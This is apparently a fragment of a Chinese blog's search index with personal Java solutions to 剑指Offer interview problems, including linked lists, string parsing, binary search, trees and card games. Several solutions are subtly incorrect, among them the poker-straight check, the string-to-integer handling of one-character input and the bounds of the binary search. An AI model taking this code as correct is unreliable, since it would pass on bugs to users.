    <content type="text"><![CDATA[链表中环的入口节点. 题目描述一个链表中包含环，请找出该链表的环的入口结点。 解题思路 定理：两个指针一个fast、一个slow同时从一个链表的头部出发 fast一次走2步，slow一次走一步，如果该链表有环，两个指针必然在环内相遇 此时只需要把其中的一个指针重新指向链表头部，另一个不变（还在环内）， 这次两个指针一次走一步，相遇的地方就是入口节点。 代码实现1234567891011121314151617181920212223242526public ListNode EntryNodeOfLoop(ListNode pHead)&#123; //空链表或者一个节点肯定没有环 if(pHead == null || pHead.next == null) return null; ListNode fast = pHead; ListNode slow = pHead; //fast一次跳两个节点，slow一次跳一个节点 //若有环，一定相遇，在环的某个节点停住 while(fast!=null &amp;&amp; fast.next!=null)&#123; fast = fast.next.next; slow = slow.next; if(fast == slow) break; &#125; //一个重新指向头，一个不动，相遇点就是入口节点 fast = pHead; while(fast != slow)&#123; fast = fast.next; slow = slow.next; &#125; return fast;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题55：字符流中第一个不重复的字符】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9855%EF%BC%9A%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6%E3%80%91%2F</url>
    <content type="text"><![CDATA[字符流中第一个不重复的字符. 题目描述请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符”go”时，第一个只出现一次的字符是”g”。当从该字符流中读出前六个字符“google”时，第一个只出现一次的字符是”l”。 输出描述如果当前字符流没有存在出现一次的字符，返回#字符。 解题思路Map！！！！ 代码实现1234567891011121314151617181920212223242526import java.util.Map;import java.util.LinkedHashMap;public class Solution &#123; //用有序的Map：LinkedHashMap来存放char，并且记录其出现次数 Map&lt;Character,Integer&gt; map = new LinkedHashMap&lt;Character,Integer&gt;(); //Insert one char from stringstream public void Insert(char ch) &#123; if(!map.containsKey(ch))&#123; map.put(ch,1); &#125;else&#123; map.put(ch,map.get(ch)+1); &#125; &#125; //return the first appearence once char in current stringstream public char FirstAppearingOnce() &#123; for(char ch:map.keySet())&#123; int count = map.get(ch); //目前第一个只出现一次的字符，返回 if(count == 1) return ch; &#125; return '#'; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题54：表示数值的字符串】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9854%EF%BC%9A%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%91%2F</url>
    <content type="text"><![CDATA[表示数值的字符串. 题目描述请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。 解题思路正确的思路一个是正则，用普通程序来做是没有意义的，当然这里还有一个更加取巧的方式，仅供参考，做线上笔试题，有的时候直接用java的类是一个很好的选择，当然面试是肯定不行的，但是笔试都过不了何来面试？^^ 代码实现1234567891011121314151617public class Solution &#123; public boolean isNumeric(char[] str) &#123; /********方法一：java的转换，抛异常 try &#123; double re = Double.parseDouble(new String(str)); &#125; catch (NumberFormatException e) &#123; return false; &#125; return true; ***********************/ //正则表达式 String string = String.valueOf(str); return string.matches("[\\+-]?[0-9]*(\\.[0-9]*)?([eE][\\+-]?[0-9]+)?"); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题53：正则表达式匹配】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9853%EF%BC%9A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E3%80%91%2F</url>
    <content type="text"><![CDATA[正则表达式匹配. 题目描述请实现一个函数用来匹配包括’.’和’‘的正则表达式。模式中的字符’.’表示任意一个字符，而’‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”abaca”匹配，但是与”aa.a”和”ab*a”均不匹配 解题思路有点麻烦，不会。 代码实现123456789101112131415161718192021222324252627282930313233343536public class Solution &#123; public boolean match(char[] str, char[] pattern) &#123; if (str == null || pattern == null) &#123; return false; &#125; int strIndex = 0; int patternIndex = 0; return matchCore(str, strIndex, pattern, patternIndex);&#125; public boolean matchCore(char[] str, int strIndex, char[] pattern, int patternIndex) &#123; //有效性检验：str到尾，pattern到尾，匹配成功 if (strIndex == str.length &amp;&amp; patternIndex == pattern.length) &#123; return true; &#125; //pattern先到尾，匹配失败 if (strIndex != str.length &amp;&amp; patternIndex == pattern.length) &#123; return false; &#125; //模式第2个是*，且字符串第1个跟模式第1个匹配,分3种匹配模式；如不匹配，模式后移2位 if (patternIndex + 1 &lt; pattern.length &amp;&amp; pattern[patternIndex + 1] == '*') &#123; if ((strIndex != str.length &amp;&amp; pattern[patternIndex] == str[strIndex]) || (pattern[patternIndex] == '.' &amp;&amp; strIndex != str.length)) &#123; return matchCore(str, strIndex, pattern, patternIndex + 2)//模式后移2，视为x*匹配0个字符 || matchCore(str, strIndex + 1, pattern, patternIndex + 2)//视为模式匹配1个字符 || matchCore(str, strIndex + 1, pattern, patternIndex);//*匹配1个，再匹配str中的下一个 &#125; else &#123; return matchCore(str, strIndex, pattern, patternIndex + 2); &#125; &#125; //模式第2个不是*，且字符串第1个跟模式第1个匹配，则都后移1位，否则直接返回false if ((strIndex != str.length &amp;&amp; pattern[patternIndex] == str[strIndex]) || (pattern[patternIndex] == '.' &amp;&amp; strIndex != str.length)) &#123; return matchCore(str, strIndex + 1, pattern, patternIndex + 1); &#125; return false; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题52：构建乘积数组】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9852%EF%BC%9A%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84%E3%80%91%2F</url>
    <content type="text"><![CDATA[构建乘积数组. 题目描述给定一个数组A[0,1,…,n-1],请构建一个数组B[0,1,…,n-1],其中B中的元素B[i]=A[0]A[1]…A[i-1]A[i+1]…A[n-1]。不能使用除法。 解题思路 // --------------------- // B0 | 1 | A1 | A2 | A3 | // --------------------- // B1 | A0 | 1 | A2 | A3 | // --------------------- // B2 | A0 | A1 | 1 | A3 | // --------------------- // B3 | A0 | A1 | A2 | 1 | // --------------------- //以上面的4*4数组为例 //B0 = A1*A2*A3,B1 = A0*A2*A3,B2 = A0*A1*A3,B3 = A0*A1*A2 //第一轮，先算左下角的元素，即 //B0 = 1, B1 = A0, B2 = A0*A1, B3 = A0*A1*A2 //第二轮，再端右上角的元素，即 //B3 = 1, B2 = A0*A1*A3(temp=A3), B1 = A0*A2*A3(temp=A3*A2), B0 = A1*A2*A3(temp=A3*A2*A1) 代码实现12345678910111213141516public int[] multiply(int[] A) &#123; int length = A.length; int[] B = new int[length]; if(length != 0)&#123; B[0] = 1; for(int i=1;i&lt;length;i++)&#123; B[i] = B[i-1]*A[i-1]; &#125; int temp = 1; for(int j=length-2;j&gt;=0;j--)&#123; temp *= A[j+1]; B[j] *= temp; &#125; &#125; return B;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题51：数组中重复的数字】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9851%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[数组中重复的数字. 题目描述在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。 解题思路好吧，对于无序数组去重复数字，map搞起。要求是输出一个任意重复的数字，那么只要进入我的 if(map.containsKey(numbers[i]))，就可以直接返回了。 代码实现123456789101112131415public boolean duplicate(int numbers[],int length,int [] duplication) &#123; if(length == 0)&#123; duplication[0] = -1; return false; &#125; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for(int i=0;i&lt;numbers.length;i++)&#123; if(map.containsKey(numbers[i]))&#123; duplication[0] = numbers[i]; return true; &#125; map.put(numbers[i],i); &#125; return false;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题50：把字符串转为整数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9850%EF%BC%9A%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B8%BA%E6%95%B4%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[把字符串转为整数. 题目描述将一个字符串转换成一个整数，要求不能使用字符串转换整数的库函数。 数值为0或者字符串不是一个合法的数值则返回0 输入描述输入一个字符串,包括数字字母符号,可以为空 输出描述如果是合法的数值表达则返回该数字，否则返回0 示例输入 +2147483647 1a33 输出 2147483647 0 解题思路先判断是否是负数，后面再逐一判断是否是合法数字，是的话就转换为整数。 代码实现1234567891011121314151617181920212223242526public class Solution &#123; public int StrToInt(String str) &#123; if(str == null || str.length() &lt;=1)&#123; return 0; &#125; char[] ch = str.toCharArray(); //1.判断是否为负数 boolean isMinus = false; if(ch[0] == '-')&#123; isMinus = true; &#125; int sum = 0; //2.遍历字符串每一位，第一位如果是符号位就跳过，后面判断是否是数字，是就加进去 for(int i=0;i&lt;ch.length;i++)&#123; if(i==0&amp;&amp;ch[i]=='+'||ch[i]=='-')&#123; continue; &#125; if(ch[i]&lt;'0' || ch[i]&gt;'9')&#123; return 0; &#125; sum = sum*10+(ch[i]-'0'); &#125; //3.返回结果 return isMinus?-sum:sum; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题49：不用加减乘除做加法】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9849%EF%BC%9A%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95%E3%80%91%2F</url>
    <content type="text"><![CDATA[不用加减乘除做加法. 题目描述写一个函数，求两个整数之和，要求在函数体内不得使用+、-、*、/四则运算符号。 解题思路说实话，这一题，我记不住… 代码实现12345678910public class Solution &#123; public int Add(int num1,int num2) &#123; while(num2 != 0)&#123; int temp = num1 ^ num2; num2 = (num1 &amp; num2) &lt;&lt; 1; num1 = temp; &#125; return num1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题48：求1+2+...+n】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9848%EF%BC%9A%E6%B1%821%2B2%2B...%2Bn%E3%80%91%2F</url>
    <content type="text"><![CDATA[求1+2+…+n. 题目描述求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。 解题思路那么可以用&amp;&amp;短路与，&amp;&amp;前面只要n还不是0，就继续后面；&amp;&amp;后面就是求和，这个求和是一个递归，递归的终止条件当然就是n=0咯。 代码实现123456789public class Solution &#123; public int Sum_Solution(int n) &#123; int sum = n; //利用&amp;&amp;的短路特性 //Sum_Solution(--n)等于0的时候,即n=0的时候，停止递归，否则一直加 boolean flag = (sum&gt;0) &amp;&amp; ((sum+=Sum_Solution(--n))&gt;0); return sum; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题47：孩子们的游戏】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9847%EF%BC%9A%E5%AD%A9%E5%AD%90%E4%BB%AC%E7%9A%84%E6%B8%B8%E6%88%8F%E3%80%91%2F</url>
    <content type="text"><![CDATA[孩子们的游戏. 题目描述每年六一儿童节,牛客都会准备一些小礼物去看望孤儿院的小朋友,今年亦是如此。HF作为牛客的资深元老,自然也准备了一些小游戏。其中,有个游戏是这样的:首先,让小朋友们围成一个大圈。然后,他随机指定一个数m,让编号为0的小朋友开始报数。每次喊到m-1的那个小朋友要出列唱首歌,然后可以在礼品箱中任意的挑选礼物,并且不再回到圈中,从他的下一个小朋友开始,继续0…m-1报数….这样下去….直到剩下最后一个小朋友,可以不用表演,并且拿到牛客名贵的“名侦探柯南”典藏版(名额有限哦!!^_^)。请你试着想下,哪个小朋友会得到这份礼品呢？(注：小朋友的编号是从0到n-1) 解题思路用LinkedList来存储孩子编号，每次表演的孩子下标都可以确定，确定后直接删除掉，循环到只剩一个孩子为止。 代码实现123456789101112131415161718192021import java.util.*;public class Solution &#123; public int LastRemaining_Solution(int n, int m) &#123; if(n &lt;= 0) return -1; //这一题用LinkedList更加合适，因为涉及删除操作 List&lt;Integer&gt; list = new LinkedList&lt;Integer&gt;(); for(int i=0;i&lt;n;i++)&#123; list.add(i); &#125; int removeIndex = 0; while(list.size() &gt; 1)&#123; //确定每次要删除的下标 removeIndex = (removeIndex+m-1)%(list.size()); list.remove(removeIndex); &#125; //删到只剩一个的时候返回 return list.size() == 1?list.get(0):-1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题46：扑克牌顺子】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9846%EF%BC%9A%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90%E3%80%91%2F</url>
    <content type="text"><![CDATA[扑克牌顺子. 题目描述LL今天心情特别好,因为他去买了一副扑克牌,发现里面居然有2个大王,2个小王(一副牌原本是54张^_^)…他随机从中抽出了5张牌,想测测自己的手气,看看能不能抽到顺子,如果抽到的话,他决定去买体育彩票,嘿嘿！！“红心A,黑桃3,小王,大王,方片5”,“Oh My God!”不是顺子…..LL不高兴了,他想了想,决定大\小 王可以看成任何数字,并且A看作1,J为11,Q为12,K为13。上面的5张牌就可以变成“1,2,3,4,5”(大小王分别看作2和4),“So Lucky!”。LL决定去买体育彩票啦。 现在,要求你使用这幅牌模拟上面的过程,然后告诉我们LL的运气如何。为了方便起见,你可以认为大小王是0。 解题思路我的思路是：既然要构成顺子，那么五张牌，比如2,3,4,5,6 这是一个顺子，那么(3-2)+(4-3)+(5-4)+(6-5)=4. 因为本题是可以用四张大小王来代替任意的数，那么如果摸到四张大小王跟一个任意牌，那么必定是顺子。 如果摸到1-3张大小王，要构成顺子，原来的任意牌之差和必定是4，否则构不成顺子。 代码实现1234567891011121314151617181920212223242526272829import java.util.*;public class Solution &#123; public boolean isContinuous(int [] numbers) &#123; //用于记录大小王个数 int count = 0; //如果是顺子，那么前后差必定为4 int minus = 0; Arrays.sort(numbers); for(int i=0;i&lt;numbers.length;i++)&#123; if(numbers[i] == 0)&#123; count++; continue; &#125; &#125; if(count == 4)&#123; //四个大小王，必定是顺子，直接返回 return true; &#125; //两两相减，如果是顺子，一定等于4，比如0,3,2,6,4，排序之后是0,2,3,4,6 //那么numbers[2]-numbers[1]=1,numbers[3]-numbers[2]=1,numbers[4]-numbers[3]=2 //那么这个就是同花顺 for(int i=count;i&lt;numbers.length-1;i++)&#123; minus += numbers[i+1]-numbers[i]; &#125; if(minus == 4) return true; return false; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题45：翻转单词顺序列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9845%EF%BC%9A%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[翻转单词顺序列. 题目描述牛客最近来了一个新员工Fish，每天早晨总是会拿着一本英文杂志，写些句子在本子上。同事Cat对Fish写的内容颇感兴趣，有一天他向Fish借来翻看，但却读不懂它的意思。例如，“student. a am I”。后来才意识到，这家伙原来把句子单词的顺序翻转了，正确的句子应该是“I am a student.”。Cat对一一的翻转这些单词顺序可不在行，你能帮助他么？ 解题思路根据空格进行分割，转化为数组逆序遍历问题。 代码实现12345678910111213141516public class Solution &#123; public String ReverseSentence(String str) &#123; if(str.trim().equals(""))&#123; return str; &#125; String[] arr = str.split(" "); StringBuilder sb = new StringBuilder(); for(int i=arr.length-1;i&gt;=0;i--)&#123; sb.append(arr[i]); if(i != 0)&#123; sb.append(" "); &#125; &#125; return sb.toString(); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题44：左旋转字符串】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9844%EF%BC%9A%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%91%2F</url>
    <content type="text"><![CDATA[左旋转字符串. 题目描述汇编语言中有一种移位指令叫做循环左移（ROL），现在有个简单的任务，就是用字符串模拟这个指令的运算结果。对于一个给定的字符序列S，请你把其循环左移K位后的序列输出。例如，字符序列S=”abcXYZdef”,要求输出循环左移3位后的结果，即“XYZdefabc”。是不是很简单？OK，搞定它！ 解题思路复制一个新字符串拼接在后面，然后从偏移量开始往后读一个字符串的长度即可。 代码实现1234567891011121314public class Solution &#123; public String LeftRotateString(String str,int n) &#123; if(str.length() == 0) return str; //字符串长度保存一下 int length = str.length(); //n大于字符串长度的时候，实际只需要循环移动n%str.length()位 n = n%length; //这是关键：两个字符串拼接 str += str; //截取（起始位置，终止位置） return str.substring(n, n+length); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题43：和为S的两个数字】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9843%EF%BC%9A%E5%92%8C%E4%B8%BAS%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[和为S的两个数字. 题目描述输入一个递增排序的数组和一个数字S，在数组中查找两个数，是的他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。 输出描述对应每个测试案例，输出两个数，小的先输出。 解题思路双指针夹逼法。 代码实现1234567891011121314151617181920212223import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; FindNumbersWithSum(int [] array,int sum) &#123; //一个下标从数组最左边开始往右移动，一个下标从数组最右边向左移动 int i=0,j=array.length-1; ArrayList&lt;Integer&gt; result = new ArrayList&lt;&gt;(); if(array.length == 0) return result; while(i &lt;= j)&#123; //i和j相距越远，乘积越小，所以遇到了就直接返回 if(array[i]+array[j] == sum)&#123; result.add(array[i]); result.add(array[j]); return result; &#125;else if(array[i]+array[j] &lt; sum)&#123; i++; &#125;else&#123; j--; &#125; &#125; return result; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题42：和为S的连续正数序列】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9842%EF%BC%9A%E5%92%8C%E4%B8%BAS%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[和为S的连续正数序列. 题目描述小明很喜欢数学,有一天他在做数学作业时,要求计算出9~16的和,他马上就写出了正确答案是100。但是他并不满足于此,他在想究竟有多少种连续的正数序列的和为100(至少包括两个数)。没多久,他就得到另一组连续正数和为100的序列:18,19,20,21,22。现在把问题交给你,你能不能也很快的找出所有和为S的连续正数序列? Good Luck! 输出描述输出所有和为S的连续正数序列。序列内按照从小至大的顺序，序列间按照开始数字从小到大的顺序 解题思路用双指针技术，计算指针之间数字的和来判断指针的移动。 因为这里是连续正整数，所以求和也比较简单，(a0+an)*n/2 代码实现1234567891011121314151617181920212223242526272829import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;ArrayList&lt;Integer&gt; &gt; FindContinuousSequence(int sum) &#123; //存放结果 ArrayList&lt;ArrayList&lt;Integer&gt; &gt; result = new ArrayList&lt;&gt;(); //两个起点，相当于动态窗口的两边，根据其窗口内的值的和来确定窗口的位置和大小 int plow = 1,phigh = 2; while(phigh &gt; plow)&#123; //由于是连续的，差为1的一个序列，那么求和公式是(a0+an)*n/2 int cur = (phigh + plow) * (phigh - plow + 1) / 2; //相等，那么就将窗口范围的所有数添加进结果集 if(cur == sum)&#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int i=plow;i&lt;=phigh;i++)&#123; list.add(i); &#125; result.add(list); plow++; //如果当前窗口内的值之和小于sum，那么右边窗口右移一下 &#125;else if(cur &lt; sum)&#123; phigh++; &#125;else&#123; //如果当前窗口内的值之和大于sum，那么左边窗口右移一下 plow++; &#125; &#125; return result; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题41：数组中只出现一次的数字】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9841%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97%E3%80%91%2F</url>
    <content type="text"><![CDATA[数组中只出现一次的数字. 题目描述一个整型数组里除了两个数字之外，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。 解题思路对于这种无序的数组求出现次数，我第一个相当map来统计。 代码实现123456789101112131415161718192021222324import java.util.Map;import java.util.HashMap;public class Solution &#123; public void FindNumsAppearOnce(int [] array,int num1[] , int num2[]) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //key-数组数字,value-数字出现的次数 for(int i=0;i&lt;array.length;i++)&#123; if(!map.containsKey(array[i]))&#123; map.put(array[i],1); &#125;else&#123; map.put(array[i],map.get(array[i])+1); &#125; &#125; int[] temp = new int[2]; int i=0; for(int k:map.keySet())&#123; if(map.get(k) == 1)&#123; temp[i++] = k; &#125; &#125; num1[0] = temp[0]; num2[0] = temp[1]; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题40：平衡二叉树】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9840%EF%BC%9A%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[平衡二叉树. 题目描述输入一棵二叉树，判断该二叉树是否是平衡二叉树。 解题思路还是刚才求最大深度的思路，平衡二叉树，即左右子树的深度不大于1。 代码实现123456789101112131415161718public class Solution &#123; boolean result = true; public boolean IsBalanced_Solution(TreeNode root) &#123; judge(root); return result; &#125; private int judge(TreeNode root)&#123; if(root == null) return 0; int leftDep = judge(root.left); int rightDep = judge(root.right); if(Math.abs(leftDep-rightDep)&gt;1)&#123; result = false; &#125; return Math.max(leftDep,rightDep)+1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题39：二叉树的深度】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9839%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉树的深度. 题目描述输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。 解题思路分解为：左右子树的最大高度+1，继续分解，直到叶子节点。 代码实现1234567891011public class Solution &#123; public int TreeDepth(TreeNode root) &#123; if(root == null) return 0; int leftDep = TreeDepth(root.left); int rightDep = TreeDepth(root.right); return Math.max(leftDep,rightDep)+1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题38：数字在排序数组中出现的次数】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9838%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[数字在排序数组中出现的次数. 题目描述统计一个数字在排序数组中出现的次数。 解题思路因为是有序数组查找，先想到二分查找法。基本思想是：用二分查找法分别找到这个数字的起始下标和终止下标。前后一减就是数量。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class Solution &#123; public int GetNumberOfK(int [] array , int k) &#123; //二分查找 int preIndex = getFirstIndex(array,k,0,array.length); int lastIndex = getLastIndex(array,k,0,array.length); //查找不到直接返回0 if(preIndex == -1 &amp;&amp; lastIndex == -1)&#123; return 0; &#125; return lastIndex-preIndex+1; &#125; private int getFirstIndex(int[] arr,int k,int start,int end)&#123; while(start &lt; end)&#123; int mid = start+(end-start)/2; if(arr[mid]==k)&#123; //找到重复数字的第一个索引位置 while(mid&gt;0 &amp;&amp; arr[mid-1] == k)&#123; mid--; &#125; return mid; &#125;else if(arr[mid] &lt; k)&#123; start = mid+1; &#125;else&#123; end = mid-1; &#125; &#125; return -1; &#125; private int getLastIndex(int[] arr,int k,int start,int end)&#123; while(start &lt; end)&#123; int mid = start+(end-start)/2; if(arr[mid]==k)&#123; //找到重复数字的最后一个索引位置 while(mid+1&lt;end &amp;&amp; arr[mid+1] == k)&#123; mid++; &#125; return mid; &#125;else if(arr[mid] &lt; k)&#123; start = mid+1; &#125;else&#123; end = mid-1; &#125; &#125; return -1; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题37：两个链表的公共结点】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9837%EF%BC%9A%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E5%85%AC%E5%85%B1%E7%BB%93%E7%82%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[两个链表的公共结点. 题目描述输入两个链表，找出它们的第一个公共结点。 注意拥有公共结点的两个链表是这样的： 链表1：0-&gt;1-&gt;2 -&gt;3-&gt;9-&gt;8 链表2：6-&gt;4-&gt;5 解题思路先遍历其中一个链表，将其放进set中，然后遍历第二个链表，遍历的同时判断set中是否存在，存在就是第一个公共结点。 代码实现1234567891011121314151617181920212223242526import java.util.HashSet;public class Solution &#123; public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2) &#123; //首先明确公共节点的含义：公共结点的意思是两个链表相遇之后后面都是一样的，不是交叉链表 if(pHead1 == null || pHead2 == null) return null; //用HashSet来实现 HashSet&lt;ListNode&gt; hashSet = new HashSet&lt;&gt;(); ListNode cur1 = pHead1; ListNode cur2 = pHead2; while(cur1 != null)&#123; hashSet.add(cur1); cur1 = cur1.next; &#125; while(cur2 != null)&#123; if(hashSet.contains(cur2))&#123; return cur2; &#125; cur2 = cur2.next; &#125; return null; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题36：数组中的逆序对】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9836%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9%E3%80%91%2F</url>
